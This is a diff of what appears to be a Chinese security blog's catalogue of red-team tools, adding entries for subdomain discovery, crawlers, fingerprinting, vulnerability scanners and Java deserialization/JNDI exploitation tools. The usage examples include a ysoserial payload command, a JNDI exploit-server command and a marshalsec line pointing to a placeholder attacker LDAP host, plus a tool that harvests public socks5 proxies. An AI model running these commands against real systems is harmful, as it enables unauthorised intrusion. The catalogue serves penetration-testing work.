@@ -402,21 +402,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2025-06-12
+                    2025-06-18
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.8k
+                    3.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    12 分
+                    15 分
                 </div>
                 
 
@@ -672,7 +672,6 @@
 <th>功能</th>
 <th>备注</th>
 <th>用法示例</th>
-<th></th>
 </tr>
 </thead>
 <tbody><tr>
@@ -681,8 +680,7 @@
 <td>8</td>
 <td>判断是否有CDN</td>
 <td></td>
-<td></td>
-<td></td>
+<td>网页检索。</td>
 </tr>
 <tr>
 <td>ip138</td>
@@ -690,6 +688,49 @@
 <td>8</td>
 <td>查询子域名及ip</td>
 <td></td>
+<td>网页检索。</td>
+</tr>
+<tr>
+<td>subfinder</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></td>
+<td>8</td>
+<td>被动子域名挖掘</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>subfinder.exe -d 域名 -sources fora,hunter,quake -v</td>
+</tr>
+<tr>
+<td>Findomain</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Findomain/Findomain">https://github.com/Findomain/Findomain</a></td>
+<td>8</td>
+<td>域名信息收集</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>findomain.exe -t htsc.com.cn</td>
+</tr>
+</tbody></table>
+<h3 id="1-1-5-爬虫"><a href="#1-1-5-爬虫" class="headerlink" title="1.1.5 爬虫"></a>1.1.5 爬虫</h3><table>
+<thead>
+<tr>
+<th>工具简称</th>
+<th>地址</th>
+<th>个人推荐指数（满分10）</th>
+<th>功能</th>
+<th>备注</th>
+<th>用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>katana</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/katana">https://github.com/projectdiscovery/katana</a></td>
+<td>8</td>
+<td>web爬虫</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>katana -u urls.txt -proxy <a target="_blank" rel="noopener" href="http://127.0.0.1:7777/">http://127.0.0.1:7777</a></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
 <td></td>
 <td></td>
 </tr>
@@ -700,7 +741,90 @@
 <td></td>
 <td></td>
 <td></td>
-<td></td>
+</tr>
+</tbody></table>
+<h3 id="1-1-6-js分析"><a href="#1-1-6-js分析" class="headerlink" title="1.1.6 js分析"></a>1.1.6 js分析</h3><table>
+<thead>
+<tr>
+<th>工具简称</th>
+<th>地址</th>
+<th>个人推荐指数（满分10）</th>
+<th>功能</th>
+<th>备注</th>
+<th>用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jsfinder</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></td>
+<td>9</td>
+<td>爬取网页/js中的子域名和url</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>python  JSFinder.py -u   URL链接</td>
+</tr>
+<tr>
+<td>JSFinderPlus</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/mickeystone/JSFinderPlus">https://github.com/mickeystone/JSFinderPlus</a></td>
+<td>9</td>
+<td>爬取网页/js中的子域名和url</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>python  JSFinderPlus.py -u   URL链接 -d</td>
+</tr>
+<tr>
+<td>Jsfinder油猴脚本</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/Threezh1/Deconstruct/tree/main/DevTools_JSFinder">https://github.com/Threezh1/Deconstruct/tree/main/DevTools_JSFinder</a></td>
+<td>9</td>
+<td>爬取网页/js中的子域名和url</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>启动油猴脚本，访问页面，f12 在console中查看获取的子域名和链接。</td>
+</tr>
+<tr>
+<td>URLFinder</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></td>
+<td>9</td>
+<td>js URL提取</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>URLFinder.exe -u 链接 -s all -m 2</td>
+</tr>
+</tbody></table>
+<h3 id="1-1-7-资产探活"><a href="#1-1-7-资产探活" class="headerlink" title="1.1.7 资产探活"></a>1.1.7 资产探活</h3><table>
+<thead>
+<tr>
+<th>工具简称</th>
+<th>地址</th>
+<th>个人推荐指数（满分10）</th>
+<th>功能</th>
+<th>备注</th>
+<th>用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Web-SurvivalScan</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/AabyssZG/Web-SurvivalScan">https://github.com/AabyssZG/Web-SurvivalScan</a></td>
+<td>8</td>
+<td>web资产探活。</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>提供 web资产列表.txt 文件</td>
+</tr>
+</tbody></table>
+<h3 id="1-1-8-指纹探测"><a href="#1-1-8-指纹探测" class="headerlink" title="1.1.8 指纹探测"></a>1.1.8 指纹探测</h3><table>
+<thead>
+<tr>
+<th>工具简称</th>
+<th>地址</th>
+<th>个人推荐指数（满分10）</th>
+<th>功能</th>
+<th>备注</th>
+<th>用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>EHole</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></td>
+<td>暂无</td>
+<td>EHole(棱洞)3.0 红队重点攻击系统指纹探测工具。</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td>EHole.exe finger -l url.txt</td>
 </tr>
 </tbody></table>
 <h2 id="1-2-边界突破"><a href="#1-2-边界突破" class="headerlink" title="1.2 边界突破"></a>1.2 边界突破</h2><h3 id="1-2-1-端口扫描"><a href="#1-2-1-端口扫描" class="headerlink" title="1.2.1 端口扫描"></a>1.2.1 端口扫描</h3><table>
@@ -858,6 +982,30 @@
 <td>win10攻防工具箱扩展集成</td>
 <td>GUI开箱即用</td>
 </tr>
+<tr>
+<td>Redis-unauth-scan</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/KRookieSec/Redis-unauth-scan">https://github.com/KRookieSec/Redis-unauth-scan</a></td>
+<td>7</td>
+<td>Redis未授权访问漏洞扫描</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td></td>
+</tr>
+<tr>
+<td>xray</td>
+<td><a target="_blank" rel="noopener" href="https://download.xray.cool/xray/1.9.4">https://download.xray.cool/xray/1.9.4</a></td>
+<td>8</td>
+<td>漏洞扫描</td>
+<td>MyCyberSecurityToolBox已扩展集成；mac已安装可使用。</td>
+<td>xray webscan –listen 127.0.0.1:7777 –html-output res.html</td>
+</tr>
+<tr>
+<td>afrog</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/zan8in/afrog">https://github.com/zan8in/afrog</a></td>
+<td>暂无</td>
+<td>漏洞扫描</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td></td>
+</tr>
 </tbody></table>
 <h3 id="1-2-4-漏洞利用工具"><a href="#1-2-4-漏洞利用工具" class="headerlink" title="1.2.4 漏洞利用工具"></a>1.2.4 漏洞利用工具</h3><table>
 <thead>
@@ -925,6 +1073,14 @@
 <td>Apache-ActiveMQ-远程代码执行漏洞(CVE-2023-46604)反弹shell利用工具。</td>
 <td>mac和win10攻防工具箱扩展集成可执行。</td>
 <td>见本站漏洞知识库之《Apache-ActiveMQ-远程代码执行漏洞(CVE-2023-46604)》</td>
+</tr>
+<tr>
+<td>ysoserial</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></td>
+<td>9</td>
+<td>Java 反序列化漏洞利用payload生成</td>
+<td>Mac；SecurityToolBox已扩展集成；</td>
+<td>D:jdk8\bin\java.exe -jar ysoserial-all.jar CommonsCollections1 ‘calc.exe’ &gt; test.bin</td>
 </tr>
 </tbody></table>
 <h3 id="1-2-5-webshell管理工具"><a href="#1-2-5-webshell管理工具" class="headerlink" title="1.2.5 webshell管理工具"></a>1.2.5 webshell管理工具</h3><table>
@@ -1138,9 +1294,17 @@
 <td>JNDI-Injection-Exploit-Plus</td>
 <td><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/download/2.3/JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/releases/download/2.3/JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar</a> 【下载地址】<a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/tree/2.3%E3%80%90%E9%A1%B9%E7%9B%AE%E5%9C%B0%E5%9D%80%E3%80%91">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/tree/2.3【项目地址】</a></td>
 <td>暂无</td>
-<td>启动JNDI利用服务</td>
-<td>mac已下载</td>
+<td>JNDI注入；生成反序列化链</td>
+<td>mac已下载；MyCyberSecurityToolBox已扩展集成；</td>
 <td><a target="_blank" rel="noopener" href="https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/blob/2.3/README_zh.md">https://github.com/cckuailong/JNDI-Injection-Exploit-Plus/blob/2.3/README_zh.md</a></td>
+</tr>
+<tr>
+<td>JNDI-Injection-Exploit</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a></td>
+<td>8</td>
+<td>启动JNDI利用服务</td>
+<td>MyCyberSecurityToolBox已扩展集成；</td>
+<td>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]</td>
 </tr>
 <tr>
 <td>git-dumper</td>
@@ -1165,6 +1329,14 @@
 <td>fuzz字典及工具</td>
 <td>MyCyberSecurityToolBox已扩展集成</td>
 <td></td>
+</tr>
+<tr>
+<td>marshalsec</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a></td>
+<td>暂无</td>
+<td>生成反序列化 Payload</td>
+<td>MyCyberSecurityToolBox已扩展集成</td>
+<td>java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.XStream JNDI ldap://your.attacker.ip:1389/Exploit</td>
 </tr>
 </tbody></table>
 <h2 id="1-3-内网攻防"><a href="#1-3-内网攻防" class="headerlink" title="1.3 内网攻防"></a>1.3 内网攻防</h2><h3 id="1-3-1-权限提升"><a href="#1-3-1-权限提升" class="headerlink" title="1.3.1 权限提升"></a>1.3.1 权限提升</h3><table>
@@ -1274,6 +1446,42 @@
 <td>6</td>
 <td>综合工具箱</td>
 <td>MyCyberSecurityToolBox已扩展集成（作者未提供收集版）</td>
+<td></td>
+</tr>
+<tr>
+<td>DudeSuite</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/x364e3ab6/DudeSuite">https://github.com/x364e3ab6/DudeSuite</a></td>
+<td>暂无</td>
+<td>综合工具箱</td>
+<td>MyCyberSecurityToolBox已扩展集成。</td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="1-5-其他工具"><a href="#1-5-其他工具" class="headerlink" title="1.5 其他工具"></a>1.5 其他工具</h2><table>
+<thead>
+<tr>
+<th>工具简称</th>
+<th>地址</th>
+<th>个人推荐指数（满分10）</th>
+<th>功能</th>
+<th>备注</th>
+<th>用法示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Deadpool</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/thinkoaa/Deadpool">https://github.com/thinkoaa/Deadpool</a></td>
+<td>10</td>
+<td>fofa、hunter、quake拉取socks5代理，自动构建代理池。</td>
+<td>MyCyberSecurityToolBox已扩展集成。【功能类似无影-轻武器库中的代理池工具。】</td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
 <td></td>
 </tr>
 <tr>
@@ -1733,7 +1941,7 @@
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">384.3k</span>
+                        class="white-color">385.8k</span>
             
             
             
